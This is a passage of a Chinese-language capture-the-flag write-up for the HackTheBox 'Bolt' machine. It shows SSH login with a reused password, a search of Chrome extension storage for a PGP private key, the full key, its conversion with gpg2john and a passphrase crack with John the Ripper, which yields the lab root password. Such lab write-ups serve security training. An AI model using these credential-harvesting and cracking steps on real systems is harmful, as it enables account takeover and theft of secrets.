/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg
pmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1
tD0sGGFpQMsI+Q==
=+pbw
-----END PGP PUBLIC KEY BLOCK-----
```

将该文件保存为`eddie.pub`

`clark@bolt.htb`的pgp公钥

```
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xsBNBGA4GX0BCAD2MdBV19tAu+SWkMJ0BkvGdQrLquHg1olUvvhvIWmmBICr
eA89HnYYKFoOxnCL1yhpArtf379rFTZJDXzbzXlnCvgZzP71MNYo2Pq3l0Zn
syfx3juIg+Fr6YYv7RotnpNaz+xFU+eHVSFRl64o+WhuxETPyJKqpRGGYjrl
WiQQP8oCGSh5ytXqK/XRswETTQEQUTkeWHVU5UV6KlYp+xL0vmu8R9UAkcrK
Go9QusV+v4i3PMsgHexuOFHXVJ5nmyGvVQ5khNtuNHruQ5M3xjsb8FtklIo1
asfbjJETUti0wYf7lOffU3+0win4uDbMDOUJEU1ZV//Z+OZq+ARBWaahABEB
AAHNH0NsYXJrIEdyaXN3b2xkIDxjbGFya0Bib2x0Lmh0Yj7CwI0EEAEIACAF
AmA4GX0GCwkHCAMCBBUICgIEFgIBAAIZAQIbAwIeAQAhCRBY7n73qDZg6hYh
BA0fEAb51vFT6RQogFjufveoNmDqjx8IAI+HW1qYWqFhO5VdgDjZLlyFzQgh
CPMjix05N8U6umsy31m0U8OaDCwN+s0S5DAz0e5OSJEF/gNVM/iTP8Ac+gwo
H2kIEUZ6cPMLgV1kwiGAQUr/Fn0biCmKQo36luQphSdT1Gbv+fOpcrLFh+bZ
EndJIgKdovUrr3eo7gyJhALzrYz9PinypoQPs6t3PXKbRWdhHulQuBZPUavH
2g6knhGnx8P2XGEbELGh2NmmB9K1B9vpjxpGokZGiVXAA00/T4rj22/fXHJO
XXFzSjoIpnPCjBozgeWtiwDwD5zFh4rg7NkcyZFwg2BZo3fFKXBENWlOIy9b
ejRn7ea1iTbK4BLOwE0EYDgZfQEIALhlzquF2jgQJkBFUC0PvpaYBNMtinA5
SiA+rKMs+qhsfJf9whelroGL4znwOw4yI+gCIdiX+qlGyxPD1LXVCHWyaTA3
fiivImGkEXV2pP3CvBjtzsYv4g9rlrXmoOrhwnhJUxcq/0D8HinpbIwQ8euM
jTCfLVCBPOLham/D/j7QLydZ0flA+z3SKJMrbx5MlhlGj2PwxWdOLII7xTol
1B7F5WUz/ILKhCkzSliiRAHJhQNlgZHV3bCHGR1YUDf30pvn9GEwbOE2DdUv
K9Mvu5Ow5PLC+EHv1Ve21bfKTE8sQbkhF7qaxoX3C47DReze7LGidk+DIPJx
Gw2JeW/EukUAEQEAAcLAdgQYAQgACQUCYDgZfQIbDAAhCRBY7n73qDZg6hYh
BA0fEAb51vFT6RQogFjufveoNmDqkwgH/Aup4vqEXUxqciTyIZUDctPY1I2v
dwcMS1J9sjW8UOy3XzkgG2+ysME09fzODTM/zwpGEQf8icUvMOq70NMeUDed
BnnVHlgwgn4W10xh8p6z24yBrU0iwRianGMX9bIzToHkxwhaj8AtQP5cXoZi
x8/MFj+LswTfZDAP10CkgS4L3bsi7nIrh3sHMPjn2RYLIVXffWTDC4TJ2HV5
IadG59FrSdK+n8vXPNPcYUcm1F6ddDGvsxjBNwCX00jDNL3Gp7fPqKQjQCh0
pMIO+51kn9QRJJP/XmJrOw2mTheT20DT26JX/K947oi/pAe8xGHrCKAqWiZ5
AeAgt0l0AiCdPTQ=
=axZz
-----END PGP PUBLIC KEY BLOCK-----
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png)

得到`passbolt`的PGP公钥和私钥,还从数据库中得到两个公钥,但缺少eddie的私钥,无法对得到的密文进行解密

试试用已知的密码去登录ssh

成功以`eddie:rT2;jW7<eY8!dX8}pQ8%`登录ssh

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png)

注意到登录提示`You have mail.`

```
find /* | grep -i mail
/var/mail
/var/mail/eddie
/var/mail/www-data
/var/mail/root
/var/mail/test
```

```
eddie@bolt:/var/mail$ ls -alh
total 24K
drwxrwsr-x  3 root     mail 4.0K Jan 30 03:03 .
drwxr-xr-x 14 root     root 4.0K Jan 26 07:14 ..
-rw-------  1 eddie    mail  909 Feb 25  2021 eddie
-rw-------  1 root     mail    1 Mar  3  2021 root
drwx--S---  5     5001 mail 4.0K Jan 30 03:04 test
-rw-------  1 www-data mail    1 Mar  3  2021 www-data
eddie@bolt:/var/mail$ cat eddie 
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

`Clark`给`Eddie`发了一封邮件,提示存在私钥备份

```
密码管理服务器已启动并正在运行。 继续将扩展程序下载到您的浏览器并登录。请务必备份您的私钥，因为我无法恢复它。 您的私钥是恢复您的帐户的唯一方法。
设置完成后，您就可以开始导入密码了。 请务必牢记良好的安全性 - 我在安全白皮书中读到的一些内容有点令人担忧...... 
```

结合前面找到的`/opt/google/chrome/chrome-sandbox`,推测要在`chrome`的扩展程序的缓存中寻找私钥

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png)

应该在`~/.config/google-chrome/Default`目录下,运行`rep -r -i -a -s "PGP PRIVATE KEY BLOCK" *`

主要在`Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/`下的一些js文件和`Local Extension Settings/didegimhafipceonhjepacocaffmoppf/`下的一个log文件,重点应该放在这个log文件中

`strings 000003.log | grep -i "PGP PRIVATE KEY BLOCK"`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png)

从文件提取出私钥,保存为`eddie.key`

```
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

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
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

[GPG 加密解密简明教程](https://gist.github.com/jhjguxin/6037564)

```bash
# kali @ kali in ~ [21:43:50] 
$ ls
BurpSuitePro  Documents  eddie.key  file.enc         Music     Public    sql_test   Videos
Desktop       Downloads  eddie.pub  lab_mi3aka.ovpn  Pictures  SecTools  Templates

# kali @ kali in ~ [21:43:50] 
$ gpg --import eddie.pub
gpg: key 1C2741A3DC3B4ABD: "Eddie Johnson <eddie@bolt.htb>" not changed
gpg: Total number processed: 1
gpg:              unchanged: 1

# kali @ kali in ~ [21:44:32] 
$ gpg --import eddie.key
gpg: key 1C2741A3DC3B4ABD: "Eddie Johnson <eddie@bolt.htb>" not changed
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1

# kali @ kali in ~ [21:44:37] 
$ gpg -d file.enc       
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
gpg: public key decryption failed: Operation cancelled
gpg: decryption failed: No secret key
```

这玩意还要输入密码...

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png)

用前面已知的去试了一下好像都不对,要用`john`去爆破了...

[Noob: trying to recover own gpg/pgp passphrase with limited set of characters](https://www.openwall.com/lists/john-users/2012/11/08/6)

这篇文章说要先把`gpg`格式转化成`john`可以读取的`hash`格式

[Cracking GPG key passwords using John The Ripper ](https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html)

~~有个叫`gpg2john`的工具,不知道为啥系统里面的john没有这个工具...~~

~~瞄了眼wp,密码是`merrychristmas`~~

```
git clone git://github.com/magnumripper/JohnTheRipper -b bleeding-jumbo john
cd john/src
./configure && make -s clean && make -sj4
```

在`john/run`中得到`gpg2john`

`./gpg2john -d eddie.key > eddie.hash`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png)

```
Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*00000000000000000000000000000000*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::eddie.key
```

`./john --wordlist=rockyou.txt eddie.hash`进行爆破,得到密码为`merrychristmas`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png)

得到一个新的密码`Z(2rmxsNW(Z?3=p/9s`,应该是`root`或者是`clark`的密码,验证确认是`root`密码

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png)